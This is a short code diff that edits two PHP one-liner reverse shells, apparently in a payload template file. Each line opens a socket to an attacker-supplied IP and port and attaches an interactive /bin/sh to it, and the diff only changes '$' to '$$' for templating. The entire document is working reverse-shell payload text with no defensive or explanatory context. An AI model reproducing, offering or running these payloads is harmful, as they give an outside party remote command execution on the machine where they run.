@@ -1,4 +1,4 @@
-php -r '$sock=fsockopen("$local_ip",$port);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$$sock=fsockopen("$local_ip",$port);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 
-php -r '$sock=fsockopen("$local_ip", $port);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+php -r '$$sock=fsockopen("$local_ip", $port);$$proc=proc_open("/bin/sh -i", array(0=>$$sock, 1=>$$sock, 2=>$$sock),$$pipes);'
